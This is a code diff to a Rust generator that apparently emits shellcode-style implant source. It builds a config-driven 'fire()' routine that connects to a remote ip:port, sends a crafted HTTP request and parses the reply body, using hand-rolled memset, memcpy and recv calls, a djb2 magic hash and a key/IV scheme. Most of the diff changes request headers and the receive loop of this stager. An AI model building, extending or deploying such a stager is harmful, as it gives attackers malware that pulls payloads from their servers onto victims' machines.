@@ -100,12 +100,16 @@ extern "C" {
 }
 "#;
 
-pub fn generate_http_header(http_header: &HttpHeader) -> String{
+pub fn generate_http_header(config: &Pulse) -> String{
+    let http_header = config.http.clone();
     let mut http_request = format!(
         "{} {} HTTP/{}\r\n",
         http_header.method, http_header.path, http_header.version
     );
-
+    
+    http_request.push_str(&format!("Host: {}\r\n", config.target));
+    http_request.push_str("Content-Length: 10\r\n");
+    http_request.push_str("Connection: close\r\n");
     for (key, value) in http_header.headers.clone() {
         http_request.push_str(&format!("{}: {}\r\n", key, value));
     }
@@ -190,7 +194,7 @@ fn make_source_code(
         anyhow::bail!("url is empty.");
     }
     let (ip, port) = url.split_at(url.find(":").unwrap());
-    let http_header = generate_http_header(&config.http);
+    let http_header = generate_http_header(&config);
     let magic = djb2_hash(&config.flags.magic);
     let key = &config.key;
     let iv = key.chars().rev().collect::<String>();
@@ -242,31 +246,36 @@ fn fire() {{
         }}
         let split_marker = b"\r\n\r\n";
         _memset(buf.as_mut_ptr(), 0, 0x100);
-        let mut offset: usize = 0;
         let mut body_offset: isize = -1;
-        while offset.lt(&0x100) {{
+        let mut offset: usize = 0;
+
+        loop {{
             let ret = recv_std(
-                socket, 
-                buf.as_ptr() as usize + offset, 
-                0x100 - offset
+                socket,
+                buf.as_ptr().add(0x4) as usize,
+                0x100 - 0x4
             );
             if ret.eq(&0) || ret.eq(&0xffffffff) {{
                 return;
             }}
-            offset += ret as usize;
+            offset += ret as usize + 4;
             body_offset = boyer_moore_search(
                 buf.as_mut_ptr(), 
-                offset, 
+                0x100, 
                 split_marker.as_ptr(), 
                 split_marker.len()
             );
-            if body_offset.ne(&-1) || offset.ge(&0x100) {{
+            if body_offset.ne(&-1) {{
                 break;
             }}
+            _memset(buf.as_mut_ptr(), 0, 0x100 - 0x4);
+            if offset.eq(&0x100) {{
+                _memcpy(buf.as_mut_ptr(), buf.as_ptr().add(ret as usize), 4);
+            }}
         }}
+
         _memset(body_buf.as_mut_ptr(), 0, 10);
         let body_offset = 4 + body_offset as usize;
-
         if (body_offset + 9).le(&offset) {{
             _memcpy(body_buf.as_mut_ptr(), buf.as_ptr().add(body_offset), 9);
         }} else {{
